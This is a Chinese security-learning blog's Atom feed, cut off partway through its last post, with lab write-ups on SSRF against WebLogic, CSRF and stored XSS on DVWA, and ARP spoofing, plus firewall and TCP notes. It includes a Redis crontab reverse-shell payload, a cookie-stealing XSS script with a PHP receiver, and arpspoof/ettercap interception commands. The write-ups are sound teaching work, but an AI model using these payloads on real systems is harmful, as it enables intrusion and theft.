<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  <subtitle>等风来</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-19T07:32:02.995Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Y0un9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>防火墙配置</title>
    <link href="http://yoursite.com/2020/06/13/%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2020/06/13/%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</id>
    <published>2020-06-13T02:58:00.000Z</published>
    <updated>2020-06-19T07:32:02.995Z</updated>
    
    <content type="html"><![CDATA[<h4 id="防火墙的基本功能"><a href="#防火墙的基本功能" class="headerlink" title="防火墙的基本功能"></a>防火墙的基本功能</h4><p> 防火墙能路由器实现路由器的所有功能。但防火墙的ip配好以后，左右两边均不连通。</p><ol><li>访问控制</li><li>攻击防护</li><li>冗余设计</li><li>路由、交换</li><li>日志记录</li><li>虚拟网络VPN</li><li>NAT</li></ol><h4 id="防火墙区域隔离"><a href="#防火墙区域隔离" class="headerlink" title="防火墙区域隔离"></a>防火墙区域隔离</h4><p>防火墙隔离出三个区域：trust、untrust、DMZ（隔离区），也可以依次表示为高、低、中。由上往下时一律放行，由下往上时不放行。</p><p>trust区域用于存放核心数据，DMZ一般为服务器提供服务。untrust区域为互联网。注意DMZ区一定不能访问trust区，防止DMZ区域被渗透时，核心数据的泄露。（hacker可通过攻击DMZ上的某一台服务器拿到DMZ所有服务器的权限。）</p><p><strong>防火墙只能做第一次的过滤，由trust区域访问互联网时，防火墙会通过返回的所有数据包，并不能检测出包内是否含有病毒，因此需要在trust与防火墙之间安装IPS</strong></p><p><img src="/images/pasted-64.png" alt="upload successful"></p><p>在web服务器前再放一台防火墙，用来过滤用户交互。这个防火墙就是WAF。一般的WAF产品价格都高于普通防火墙</p><h4 id="防火墙分类"><a href="#防火墙分类" class="headerlink" title="防火墙分类"></a>防火墙分类</h4><ul><li><p>按防火墙形态</p><p>   硬件防火墙</p><p>  软件防火墙</p></li></ul><ul><li><p>按防火墙技术</p><p>  包过滤防火墙</p><p>  WAF防火墙</p><p>  应用(代理)防火墙</p><p> 状态检测包防火墙</p><p> 应用层防火墙</p></li></ul><h4 id="状态检测FW工作原理"><a href="#状态检测FW工作原理" class="headerlink" title="状态检测FW工作原理"></a>状态检测FW工作原理</h4><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>当内网某个ip想要访问外网时，首先经过防火墙进行状态检测，如果在状态检测表中存在，则直接放行。会在状态检测表中添加此次会话，将源ip进行nat地址转换，发出数据包，会话维持的时间可自定义，一般是1min。如果在状态检测表中存在，则直接放行。</p><p><img src="/images/pasted-66.png" alt="upload successful"></p><h4 id="衡量防火墙性能的五大指标"><a href="#衡量防火墙性能的五大指标" class="headerlink" title="衡量防火墙性能的五大指标"></a>衡量防火墙性能的五大指标</h4><ol><li>吞吐量：在不丢包的情况下单位时间内通过的数据报流量。</li><li>时延：数据报第一个比特进入防火墙到最后一比特从防火墙输出的时间间隔。</li><li>丢包率</li><li>并发连接数：可以同时处理的点对点连接的最多数目。</li><li>新建连接数：不丢包的情况下每秒可以建立的最大连接数。</li></ol><h4 id="防火墙工作模式"><a href="#防火墙工作模式" class="headerlink" title="防火墙工作模式"></a>防火墙工作模式</h4><h5 id="透明模式"><a href="#透明模式" class="headerlink" title="透明模式"></a>透明模式</h5><p>内网、外网及DMZ区处于同一网段,此时的防火墙相当于交换机，但仍可以做区域隔离。虽然不同区域处于同一网段，但彼此不能ping通。</p><p>优点：朝网络中加入防火墙时，不会影响原本的网络结构，只需要装上防火墙，设置策略即可。此时防火墙工作在二层（数据链路层）</p><p><img src="/images/pasted-67.png" alt="upload successful"></p><h5 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h5><p>防火墙工作在三层,此时相当于三层交换机</p><p><img src="/images/pasted-68.png" alt="upload successful"></p><h5 id="混杂模式（标准应用）"><a href="#混杂模式（标准应用）" class="headerlink" title="混杂模式（标准应用）"></a>混杂模式（标准应用）</h5><p><img src="/images/pasted-69.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;防火墙的基本功能&quot;&gt;&lt;a href=&quot;#防火墙的基本功能&quot; class=&quot;headerlink&quot; title=&quot;防火墙的基本功能&quot;&gt;&lt;/a&gt;防火墙的基本功能&lt;/h4&gt;&lt;p&gt; 防火墙能路由器实现路由器的所有功能。但防火墙的ip配好以后，左右两边均不连通。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SSRF及weblogic漏洞实战</title>
    <link href="http://yoursite.com/2020/06/11/SSRF%E5%8F%8Aweblogic%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2020/06/11/SSRF%E5%8F%8Aweblogic%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</id>
    <published>2020-06-11T10:56:57.000Z</published>
    <updated>2020-06-11T11:48:00.348Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h4><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。由于SSRF是在服务端发出，服务端位于内网，因此SSRF很容易导致内网渗透和getshell</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p><h4 id="IPV4的内网分段"><a href="#IPV4的内网分段" class="headerlink" title="IPV4的内网分段"></a>IPV4的内网分段</h4><p>C类：192.168.0.0 - 192.168.255.255 </p><p>B类：172.16.0.0 - 172.31.255.255 </p><p>A类：10.0.0.0 - 10.255.255.255</p><h4 id="weblogic渗透"><a href="#weblogic渗透" class="headerlink" title="weblogic渗透"></a>weblogic渗透</h4><ul><li>首先搭建好vulhub环境，启动docker靶机。访问</li></ul><p><code>http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p>稍等片刻后出现如下界面则启动成功<br><img src="/images/pasted-51.png" alt="upload successful"></p><ul><li><p>随便输入一个网址，如<code>http://www.baidu.com</code>。用bp抓包，往下面翻，可以看到成功收到了回复。<br><img src="/images/pasted-52.png" alt="upload successful"></p></li><li><p>更改operator里面的url地址，改为<code>http://localhost:7001</code> ，出现404，说明这个端口号是开放的</p></li></ul><p><img src="/images/pasted-54.png" alt="upload successful"></p><ul><li>端口再改成7002试试，此时报错不能通过http进行连接，说明这个端口号是没有开放的。试到这里已经说明存在SSRF漏洞了。</li></ul><p><img src="/images/pasted-55.png" alt="upload successful"></p><ul><li>接下来要做一个内网的ip以及端口探测，这里关于ip和端口的探测先留个坑。就在docker上直接查看内网的ip。<br>redis对外开放的默认端口为6379且存在未授权访问漏洞。因此我们实际要访问的url为<code>172.18.0.1:6379</code></li></ul><p><img src="/images/pasted-57.png" alt="upload successful"></p><p><img src="/images/pasted-56.png" alt="upload successful"></p><h6 id="利用redis进行shell反弹"><a href="#利用redis进行shell反弹" class="headerlink" title="利用redis进行shell反弹"></a>利用redis进行shell反弹</h6><p>在本地启动nc监听 </p><p><img src="/images/pasted-58.png" alt="upload successful"></p><p>放出payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.124.128&#x2F;2333 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p>我们还需要payload进行url编码。原因可以看下面这个链接</p><p><a href="https://blog.csdn.net/w4187402/article/details/90602664?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase" target="_blank" rel="noopener">http请求中对特殊字符的处理</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.124.128%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;SSRF概述&quot;&gt;&lt;a href=&quot;#SSRF概述&quot; class=&quot;headerlink&quot; title=&quot;SSRF概述&quot;&gt;&lt;/a&gt;SSRF概述&lt;/h4&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CSRF攻击及防御</title>
    <link href="http://yoursite.com/2020/06/11/CSRF%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
    <id>http://yoursite.com/2020/06/11/CSRF%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/</id>
    <published>2020-06-11T02:34:41.000Z</published>
    <updated>2020-06-11T03:59:04.498Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h4><p>CSRF(跨站请求伪造)本质上是在用户已登录的情况下，点开另外一个由hacker恶意构造的网站。（同一浏览器中点开），由于浏览器会存储用户的cookie，hacker可以盗取此时用户的cookie来进行一些违规操作。（这一点比较像XSS）,用DVWA做一个实验。</p><p>盗一张百度百科的图</p><p><img src="/images/pasted-50.png" alt="upload successful"></p><h4 id="DVWA模拟CSRF"><a href="#DVWA模拟CSRF" class="headerlink" title="DVWA模拟CSRF"></a>DVWA模拟CSRF</h4><p>这里在win10虚拟机内使用phpstudy搭建DVWA靶场。在根目录下写入一个csrf.html文件。</p><p>恶意代码如下。192.168.124.137是DVWA靶场地址</p><p><img src="/images/pasted-45.png" alt="upload successful"></p><p>在DVWA中将安全级别调至low。当我们修改密码时会发送get请求，参数中带有我们请求的数据。</p><p><img src="/images/pasted-46.png" alt="upload successful"></p><p>保持登录状态，访问csrf.html页面,此时没什么特殊，用户会以为点击了一个无效界面。但此时用户名和密码已经更改了。尝试一下使用root登录。登录成功</p><p><img src="/images/pasted-49.png" alt="upload successful"></p><h4 id="同源策略不能有效防止CSRF"><a href="#同源策略不能有效防止CSRF" class="headerlink" title="同源策略不能有效防止CSRF"></a>同源策略不能有效防止CSRF</h4><p>先看一下同源策略的概念：</p><p><strong>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。</strong></p><ol><li><p>页面中的链接，重定向以及表单提交是不会受到同源策略限制的。</p></li><li><p>跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>可以看出：</p></li></ol><p><strong>同源策略仅仅阻止了脚本读取来自其他站点的内容。但是却没有防止向其他站点发出请求。因为CSRF攻击是由于某些请求被发出，而引起在服务器端执行了某些动作所引起的，所以同源策略无法防止CSRF攻击。</strong></p><p>因此我们可以使用a标签,img标签实现CSRF</p><h4 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h4><ol><li><p>前端使用POST方式传递表单数据，后台也仅接受POST数据。这样可以防止hacker利用<code>scr</code>来发起GET请求。这样能抵御一部分攻击，但本身其实也并不安全。hacker可以构造js代码，发送post请求。</p></li><li><p>使用 Referer来验证请求的来源。但是这样也有一个缺点，hacker可以将服务器页面改为对应的xxx.html来绕绕过</p></li><li><p>验证码：<br>这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，这个方案可以完全解决CSRF，但是易用性不太好。</p></li><li><p>token认证</p></li></ol><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><p>Token是在服务端产生的。如果前端使用用户名和密码向服务端发送请求认证，服务端认证成功，那么在服务端会返回Token给前端。前端可以在每次请求的时候带上Token证明自己的合法地位。如果Token在服务端持久化，那他就是一个永久的身份令牌。</p><p>一个用户必须要输入用户名密码并验证通过后，服务器才会分配一个Token，传回并储存在客户端作为凭证（同时储存在服务器上）。因此并不是每个人都可以获得这个Token，只有能提供正确用户密码的客户端才可以。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;CSRF概述&quot;&gt;&lt;a href=&quot;#CSRF概述&quot; class=&quot;headerlink&quot; title=&quot;CSRF概述&quot;&gt;&lt;/a&gt;CSRF概述&lt;/h4&gt;&lt;p&gt;CSRF(跨站请求伪造)本质上是在用户已登录的情况下，点开另外一个由hacker恶意构造的网站。（同一浏览器
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ARP协议</title>
    <link href="http://yoursite.com/2020/06/09/ARP%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2020/06/09/ARP%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/</id>
    <published>2020-06-09T09:17:09.000Z</published>
    <updated>2020-06-10T03:24:52.902Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ARP概述"><a href="#ARP概述" class="headerlink" title="ARP概述"></a>ARP概述</h4><p>网络设备有数据要发送给另一台网络设备时，必须要知道对方的网络层地址（即IP地址）。IP地址由网络层来提供，但是仅有IP地址是不够的，IP数据报文必须封装成帧才能通过数据链路进行发送。数据帧必须要包含目的MAC地址，因此发送端还必须获取到目的MAC地址。（ARP工作在数据链路层）</p><p>ARP （地址解析协议）是根据IP地址获取MAC地址的一个TCP/IP协议，目前ARP只适用于IPV4，在IPV6中使用NDP(邻居发现协议)。</p><h4 id="ARP工作流程"><a href="#ARP工作流程" class="headerlink" title="ARP工作流程"></a>ARP工作流程</h4><p>假设主机A和B在同一个网段，主机A要向主机B发送信息，具体的地址解析过程如下：</p><p>(1) 主机A首先查看自己的ARP表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。</p><p>(2) 如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。</p><p>(3) 主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</p><p>(4) 主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。</p><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p>由于ARP协议功工作在数据链路层，隐蔽性更高，并且系统不会判断ARP缓存的正确与否，因此很容易出现ARP攻击</p><h6 id="1-ARP单向欺骗"><a href="#1-ARP单向欺骗" class="headerlink" title="1. ARP单向欺骗"></a>1. ARP单向欺骗</h6><p>当主机A和主机B通信时，主机A在自身的ARP缓存中没有找到主机B的MAC地址，主机A将会向整个局域网内发送ARP广播。此时有主机C（攻击者）响应主机A，谎称自己是主机B，并把自己的MAC地址发送给A，A收到后就会缓存起来。从此A发送给B的数据都会被C截断。</p><h6 id="2-ARP双向欺骗"><a href="#2-ARP双向欺骗" class="headerlink" title="2. ARP双向欺骗"></a>2. ARP双向欺骗</h6><p>当主机A和主机B通信时，主机C（攻击者）对A谎称自己是B，对B谎称自己是A。这样双向的数据都被C截获</p><h6 id="3-对内网PC的网关欺骗。"><a href="#3-对内网PC的网关欺骗。" class="headerlink" title="3. 对内网PC的网关欺骗。"></a>3. 对内网PC的网关欺骗。</h6><p>主机C（攻击者）向局域网发送ARP广播，谎称自己是网关。此时主机A和主机B更新ARP表时就会把网关信息更新为C的地址。此时主机A和主机B发送数据都通过了主机C。此时明显现象就是主机A和B都无法上网</p><h6 id="4-对路由器ARP表的欺骗"><a href="#4-对路由器ARP表的欺骗" class="headerlink" title="4. 对路由器ARP表的欺骗"></a>4. 对路由器ARP表的欺骗</h6><p>截获网关数据。主机C通知路由器一系列错误的内网mac地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的mac地址，造成正常pc无法收到信息。</p><h4 id="kali上利用arpspoof实现ARP攻击"><a href="#kali上利用arpspoof实现ARP攻击" class="headerlink" title="kali上利用arpspoof实现ARP攻击"></a>kali上利用arpspoof实现ARP攻击</h4><p><strong>初始化阶段</strong></p><ul><li>开启IP转发功能</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><ul><li>检查是否开启成功，输出为1时开启成功</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><ul><li>启动Arpspoof注入攻击目标系统。攻击的方法是攻击者发送ARP数据包，以欺骗网关。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -t 被害人ip 网关ip -i eth0</span><br></pre></td></tr></table></figure><p>其中</p><p>-i（interface）</p><p>网卡eth0</p><p>目标-t（target）</p><p>这里做一个示范,使用dirftnet截取到了受害者主机访问的图片。因为我们欺骗目标机，使目标机的流量经过自己的网卡，所以这里我们嗅探自己的网卡.也可以使用ettercap获取用户的账号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-43.png" alt="upload successful"></p><p><img src="/images/pasted-42.png" alt="upload successful"></p><h4 id="ARP欺骗防御"><a href="#ARP欺骗防御" class="headerlink" title="ARP欺骗防御"></a>ARP欺骗防御</h4><p><a href="https://www.zhihu.com/question/23401171" target="_blank" rel="noopener">这里关于ARP欺骗的防御讲得很好</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ARP概述&quot;&gt;&lt;a href=&quot;#ARP概述&quot; class=&quot;headerlink&quot; title=&quot;ARP概述&quot;&gt;&lt;/a&gt;ARP概述&lt;/h4&gt;&lt;p&gt;网络设备有数据要发送给另一台网络设备时，必须要知道对方的网络层地址（即IP地址）。IP地址由网络层来提供，但是仅有I
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>随笔</title>
    <link href="http://yoursite.com/2020/06/09/%E9%9A%8F%E7%AC%94/"/>
    <id>http://yoursite.com/2020/06/09/%E9%9A%8F%E7%AC%94/</id>
    <published>2020-06-09T06:47:08.000Z</published>
    <updated>2020-06-09T09:14:12.423Z</updated>
    
    <content type="html"><![CDATA[<p>一个月来断断续续还是写了一些技术文章了，算是记录下自己成长的过程，还有很多东西在另外的博客上，懒得搬过来了。</p><p>   最近正是梅雨时节，南方的天气诡异，一天晴一天雨，这样诡异的天气也正好赶走酷暑，比起一个月前的37°，这段时间是很舒服的。写完报告躺了一会睡不着，还是从床上爬起来了，想来最近白天夜晚的睡不着也和心情有关。最近不知道在想些什么，总觉得烦躁不安，希望可以早日摆脱负面情绪。</p><p>   临近期末，考试、项目、比赛在这段时间同时压上来了，事情还是挺多，不想那么多了，好好做事吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个月来断断续续还是写了一些技术文章了，算是记录下自己成长的过程，还有很多东西在另外的博客上，懒得搬过来了。&lt;/p&gt;
&lt;p&gt;   最近正是梅雨时节，南方的天气诡异，一天晴一天雨，这样诡异的天气也正好赶走酷暑，比起一个月前的37°，这段时间是很舒服的。写完报告躺了一会睡不着，
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://yoursite.com/2020/06/07/XSS-O1/"/>
    <id>http://yoursite.com/2020/06/07/XSS-O1/</id>
    <published>2020-06-07T07:13:24.000Z</published>
    <updated>2020-06-11T03:48:01.484Z</updated>
    
    <content type="html"><![CDATA[<h5 id="XSS简述"><a href="#XSS简述" class="headerlink" title="XSS简述"></a>XSS简述</h5><p>xss（跨站脚本）是指恶意利用网站提供的接口，没有对用户提交的数据进行转义，或者过滤不足的缺点，进而添加一些代码嵌入到web页面中，使别的用户访问都会执行相应的嵌入代码。</p><p>xss可以盗取用户资料，利用用户身份进行某种动作或者对范跟着进行病毒侵害。</p><h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><ol><li>盗取各类用户账号</li><li>控制企业数据</li><li>盗取重要数据</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向别的网站发起攻击</li></ol><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>非持久性xss，漏洞产生的原因在于攻击者注入的数据反映在响应中。如包含一个带XSS攻击向量的链接，每次攻击都需要用户的点击。</p><p>PS:反射型的xss实际作用不大，毕竟没人会自己打自己</p><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>一般是XSS代码放在了网站数据库，页面被用户打开即执行。存储型XSS危害更大。如留言板XSS。用户提交的XSS代码会被保存到数据库中。当目标用户查看留言板时，就会执行xss代码。这里使用kali和DVWA做一个盗取cookie的例子。</p><ul><li><p>打开kali运行apache</p><p>   <code>service apache2 start</code></p></li><li><p>在/var/www/html/目录下写入一个cookie_rec.php，这里我们接受cookie参数，并把内容写入到cookie.txt文件夹中</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie &#x3D; $_GET[&#39;cookie&#39;];</span><br><span class="line">$log &#x3D; fopen(&#39;cookie.txt&#39;,&#39;a&#39;);</span><br><span class="line">fwrite($log,$cookie);</span><br><span class="line">fclose($log);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>别忘了给文件都增加一个权限才能成功写入cookie.txt文件。cd到 /var/www/,这里为了简单我就直接全部777了</li></ul><p><code>chmod -R 777 html</code></p><ul><li>在DVWA中修改输入框的最长文字长度限制，可以把maxlength属性直接去掉或者改为一个更大的数字</li></ul><p><img src="/images/pasted-34.png" alt="upload successful"></p><ul><li>输入xss代码</li></ul><p><code>&lt;script&gt;window.open(&#39;http://192.168.124.129/cookie_rec.php?cookie=&#39;+document.cookie)&lt;/script&gt;</code></p><p>这里实现一个页面跳转，并在跳转的时候获取本地的cookie值发送给cookie_rec.php。这样就实现了盗取本地cookie到指定服务器。</p><p><img src="/images/pasted-35.png" alt="upload successful"></p><p>可以看到这里已经成功实现了页面跳转，并且带上了cookie值</p><p><img src="/images/pasted-36.png" alt="upload successful"></p><p>再到kali上看一下，成功读取到了cookie</p><p><img src="/images/pasted-37.png" alt="upload successful"></p><p>PS:一般浏览器都会关闭掉默认的链接跳转，不过大多数用户为了访问还是会允许这个xss代码执行</p><h5 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h5><p>用kali上集成的beff即可</p><p>commands内的是我们可以对肉鸡进行的一些操作</p><p><img src="/images/pasted-39.png" alt="upload successful"></p><ol><li>绿色对目标主机生效并且不会被发现（一般是观察类）</li><li>橙色对目标主机生效并且可能会被发现</li><li>灰色对目标主机未必生效（可以进行验证）</li><li>红色对目标主机不生效</li></ol><p><img src="/images/pasted-40.png" alt="upload successful"></p><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ol><li>http-only(防止XSS)</li></ol><p>如果在Cookie中设置了”HttpOnly”属性，那么通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样能有效的防止XSS攻击。</p><ol start="2"><li>对用户输入的信息进行过滤和转义</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;XSS简述&quot;&gt;&lt;a href=&quot;#XSS简述&quot; class=&quot;headerlink&quot; title=&quot;XSS简述&quot;&gt;&lt;/a&gt;XSS简述&lt;/h5&gt;&lt;p&gt;xss（跨站脚本）是指恶意利用网站提供的接口，没有对用户提交的数据进行转义，或者过滤不足的缺点，进而添加一些代码嵌入
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>TCP三次握手和四次握手</title>
    <link href="http://yoursite.com/2020/06/03/TCP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/06/03/TCP%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-06-03T12:55:40.000Z</published>
    <updated>2020-06-03T14:39:19.989Z</updated>
    
    <content type="html"><![CDATA[<p>TCP（传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。连接到不同但互连的计算机通信网络的主计算机中的成对进程之间依靠TCP提供可靠的通信服务。</p><h5 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h5><p>这里先说一下tcp三次握手的过程</p><ul><li>第一次握手：客户端发了个连接请求消息到服务端，服务端收到信息后知道自己与客户端是可以连接成功的。（客户端向服务器端发出请求）</li></ul><p>建立连接时，客户端发送syn包（syn=x）到服务器，并进入SYN_SENT状态，等待服务器确认；</p><ul><li>第二次握手：由于客户端并不知道服务端是否已经接收到了它的请求，所以服务端接收到消息后的应答，需要对客户端进行反馈。此时客户端确信可以和服务端进行连接。(服务端向客户端反馈请求)</li></ul><p>服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（syn=y），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p><ul><li>第三次握手：为防止服务器端收到的报文已经失效，（客户端发出去的第一个连接请求由于某些原因在网络节点中滞留了导致延迟）此时需要客户端再向服务端反馈一下。(防止服务器端持续的等待造成资源浪费)</li></ul><p>客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p><p>提一下tcp报文中的一些重要字段</p><p>（1）序号（sequence number）：Seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。</p><p>（2）确认号（acknowledgement number）：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。（个人理解ack=seq+1是为了确认上一条数据流成功接收）</p><p>（3）标志位（Flags）：共6个，即URG、ACK、PSH、RST、SYN、FIN等。具体含义如下：</p><p>URG：紧急指针（urgent pointer）有效。</p><p>ACK：确认序号有效。</p><p>PSH：接收方应该尽快将这个报文交给应用层。</p><p>RST：重置连接。</p><p>SYN：发起一个新连接。握手完成后SYN标志位被置0。</p><p>FIN：释放一个连接。FIN=1表示：此报文段的发送方的数据已经发送完毕，并要求释放运输连接<br><img src="/images/pasted-32.png" alt="upload successful"></p><h5 id="四次握手"><a href="#四次握手" class="headerlink" title="四次握手"></a>四次握手</h5><p>tcp四次握手用于释放连接，由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。（比起连接时多次握手的原因）</p><p><img src="/images/pasted-33.png" alt="upload 